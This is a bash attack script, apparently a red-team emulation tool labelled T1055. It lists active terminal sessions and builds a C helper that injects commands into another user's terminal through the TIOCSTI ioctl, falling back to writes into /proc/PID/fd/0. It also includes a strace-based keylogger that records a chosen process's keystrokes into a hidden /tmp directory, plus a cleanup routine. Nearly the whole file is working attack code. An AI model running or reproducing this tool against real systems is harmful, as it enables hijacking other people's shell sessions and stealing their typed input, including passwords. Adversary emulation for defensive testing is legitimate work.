#!/bin/bash
# T1055 — Process Injection: TIOCSTI Terminal Injection
# Inject commands into other terminal sessions via ioctl

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

MARKER="d3m0n_tiocsti"
WORKDIR="/tmp/.${MARKER}"

banner() {
    echo -e "${RED}"
    echo "  ╔═══════════════════════════════════════════════╗"
    echo "  ║   T1055 — TIOCSTI Terminal Injection          ║"
    echo "  ║   Inject commands into other terminals        ║"
    echo "  ╚═══════════════════════════════════════════════╝"
    echo -e "${NC}"
}

check_tiocsti() {
    # Check if TIOCSTI is available (blocked since Linux 6.2)
    local KVER
    KVER=$(uname -r | cut -d. -f1-2)
    local MAJOR MINOR
    MAJOR=$(echo "$KVER" | cut -d. -f1)
    MINOR=$(echo "$KVER" | cut -d. -f2)

    if [[ "$MAJOR" -gt 6 ]] || [[ "$MAJOR" -eq 6 && "$MINOR" -ge 2 ]]; then
        # Check if legacy mode is enabled
        if [[ -f /proc/sys/dev/tty/legacy_tiocsti ]]; then
            local VAL
            VAL=$(cat /proc/sys/dev/tty/legacy_tiocsti 2>/dev/null)
            if [[ "$VAL" == "0" ]]; then
                echo -e "${YELLOW}[!] TIOCSTI blocked (kernel ≥6.2, legacy_tiocsti=0)${NC}"
                echo -e "${YELLOW}[*] Using /proc/PID/fd/0 write fallback${NC}"
                return 1
            fi
        else
            echo -e "${YELLOW}[!] TIOCSTI likely blocked (kernel ≥6.2)${NC}"
            return 1
        fi
    fi
    return 0
}

list_terminals() {
    echo -e "${CYAN}[*] Enumerating active terminal sessions...${NC}"
    echo ""

    echo -e "  ${YELLOW}pts (pseudo-terminals):${NC}"
    who 2>/dev/null | while read -r user tty rest; do
        local pid
        pid=$(ps -t "$tty" -o pid= 2>/dev/null | head -1 | tr -d ' ')
        echo -e "    ${GREEN}/dev/${tty}${NC} — ${user} (shell PID: ${pid})"
    done

    echo ""
    echo -e "  ${YELLOW}All terminal devices with active shells:${NC}"
    ps aux 2>/dev/null | grep -E "bash|zsh|sh|fish" | grep -v grep | \
        while read -r user pid _ _ _ _ _ _ _ cmd; do
            local tty
            tty=$(readlink "/proc/${pid}/fd/0" 2>/dev/null)
            [[ -n "$tty" ]] && echo -e "    ${GREEN}${tty}${NC} — ${user} (${cmd})"
        done
}

deploy_tiocsti() {
    echo -e "${CYAN}[*] Deploying TIOCSTI terminal injection${NC}"
    echo ""

    if check_tiocsti; then
        deploy_tiocsti_ioctl
    else
        deploy_fd_write
    fi
}

deploy_tiocsti_ioctl() {
    echo -e "${YELLOW}[*] Using TIOCSTI ioctl to push characters into terminal input buffer.${NC}"
    echo ""

    if ! command -v gcc &>/dev/null; then
        echo -e "${RED}[!] gcc required${NC}"; return
    fi

    mkdir -p "$WORKDIR"

    cat > "${WORKDIR}/tiocsti.c" << CEOF
#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <termios.h>

#define TIOCSTI 0x5412

int main(int argc, char *argv[]) {
    if (argc < 3) {
        fprintf(stderr, "Usage: %s /dev/pts/N \"command\"\n", argv[0]);
        return 1;
    }

    int fd = open(argv[1], O_RDWR);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    /* Push each character into the terminal's input queue */
    const char *cmd = argv[2];
    for (int i = 0; cmd[i]; i++) {
        if (ioctl(fd, TIOCSTI, &cmd[i]) < 0) {
            perror("ioctl TIOCSTI");
            close(fd);
            return 1;
        }
    }

    /* Push newline to execute */
    char nl = '\n';
    ioctl(fd, TIOCSTI, &nl);

    close(fd);
    return 0;
}
CEOF

    gcc -o "${WORKDIR}/tiocsti" "${WORKDIR}/tiocsti.c" 2>/dev/null
    if [[ $? -ne 0 ]]; then
        echo -e "${RED}[!] Compilation failed${NC}"; return
    fi

    read -p "  Target terminal (e.g., /dev/pts/0): " TARGET
    [[ -z "$TARGET" ]] && { list_terminals; return; }
    read -p "  Command to inject: " CMD
    [[ -z "$CMD" ]] && CMD="id"

    "${WORKDIR}/tiocsti" "$TARGET" "$CMD"
    if [[ $? -eq 0 ]]; then
        echo -e "${GREEN}[+] Injected '${CMD}' into ${TARGET}${NC}"
        echo -e "${YELLOW}[*] Command executes in victim's shell session${NC}"
    else
        echo -e "${RED}[!] Injection failed — try /proc/PID/fd/0 method${NC}"
    fi
}

deploy_fd_write() {
    echo -e "${YELLOW}[*] Using /proc/PID/fd/0 write method (works on kernel ≥6.2)${NC}"
    echo ""

    echo -e "  ${CYAN}Target selection:${NC}"
    list_terminals
    echo ""

    read -p "  Target PID (shell process): " TARGET_PID
    [[ -z "$TARGET_PID" ]] && { echo -e "${RED}[!] PID required${NC}"; return; }
    read -p "  Command to inject: " CMD
    [[ -z "$CMD" ]] && CMD="id"

    local FD="/proc/${TARGET_PID}/fd/0"
    if [[ ! -w "$FD" ]]; then
        echo -e "${RED}[!] Cannot write to ${FD} — need same user or root${NC}"
        return
    fi

    # Write command + newline to the terminal's stdin fd
    echo "$CMD" > "$FD" 2>/dev/null
    if [[ $? -eq 0 ]]; then
        echo -e "${GREEN}[+] Command written to ${FD}${NC}"
        echo -e "${YELLOW}[*] May appear in victim's terminal (depends on shell)${NC}"
    else
        echo -e "${RED}[!] Write failed${NC}"
    fi
}

deploy_tiocsti_keylogger() {
    echo -e "${CYAN}[*] Deploying terminal input sniffer (reverse TIOCSTI)${NC}"
    echo ""

    echo -e "${YELLOW}[*] Reads keystrokes from /proc/PID/fd/0 or uses TIOCLINUX${NC}"

    read -p "  Target PID to sniff: " TARGET_PID
    [[ -z "$TARGET_PID" ]] && { echo -e "${RED}[!] PID required${NC}"; return; }

    mkdir -p "$WORKDIR"
    local LOGFILE="${WORKDIR}/keylog_${TARGET_PID}.log"

    # Use strace to capture read() calls on the target's stdin
    if command -v strace &>/dev/null; then
        nohup strace -p "$TARGET_PID" -e read -s 256 2>&1 | \
            grep "read(0" | sed 's/.*"\(.*\)".*/\1/' > "$LOGFILE" &
        echo -e "${GREEN}[+] Keylogger active on PID ${TARGET_PID}${NC}"
        echo -e "${GREEN}[+] Log: ${LOGFILE}${NC}"
    else
        echo -e "${RED}[!] strace not available${NC}"
    fi
}

cleanup() {
    echo -e "${CYAN}[*] Cleaning up TIOCSTI injection...${NC}"

    pkill -f "tiocsti\|keylog" 2>/dev/null
    rm -rf "$WORKDIR"

    echo -e "${GREEN}[+] TIOCSTI injection cleaned up${NC}"
}

main() {
    banner

    echo -e "  ${CYAN}[1]${NC} List active terminals"
    echo -e "  ${CYAN}[2]${NC} Inject command into terminal"
    echo -e "  ${CYAN}[3]${NC} Deploy terminal keylogger"
    echo -e "  ${CYAN}[4]${NC} Cleanup"
    echo ""
    read -p "Choose [1-4]: " OPT

    case "$OPT" in
        1) list_terminals ;;
        2) deploy_tiocsti ;;
        3) deploy_tiocsti_keylogger ;;
        4) cleanup ;;
        *) echo -e "${RED}[!] Invalid option${NC}" ;;
    esac
}

main
